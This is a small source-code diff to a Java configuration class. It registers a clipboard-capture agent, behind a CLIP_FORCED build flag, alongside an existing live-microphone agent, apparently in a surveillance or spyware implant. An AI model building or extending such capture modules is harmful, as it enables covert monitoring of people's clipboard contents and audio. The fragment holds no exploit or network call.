@@ -529,6 +529,11 @@ public final class Conf {
         Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true, new byte[0]);
         status.addAgent(agent3);
         //#endif
+        
+        //#ifdef CLIP_FORCED
+        Agent agent4 = Agent.factory(Agent.AGENT_CLIPBOARD, true, new byte[0]);
+        status.addAgent(agent4);
+        //#endif
 
         //#ifdef DEBUG
         debug.trace("ParseAgent - OK");
